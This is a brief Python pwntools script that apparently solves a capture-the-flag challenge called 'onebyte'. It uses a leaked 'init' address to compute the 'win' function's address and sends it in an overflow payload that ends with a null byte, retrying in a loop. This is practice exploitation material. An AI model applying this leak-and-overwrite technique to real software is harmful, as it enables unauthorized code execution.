from pwn import *

while True:
    exe = ELF('./onebyte')
    io = process(exe.path)

    win = exe.symbols["win"]
    init = exe.symbols["init"]

    io.recvuntil(b'Free junk:')
    init_addr = int(io.recvline(), 16)
    win_addr = init_addr - init + win

    io.recvuntil(b'Your turn:')
    io.sendline(pack(win_addr) * 4 + b'\x00')
    io.interactive()
    io.close()
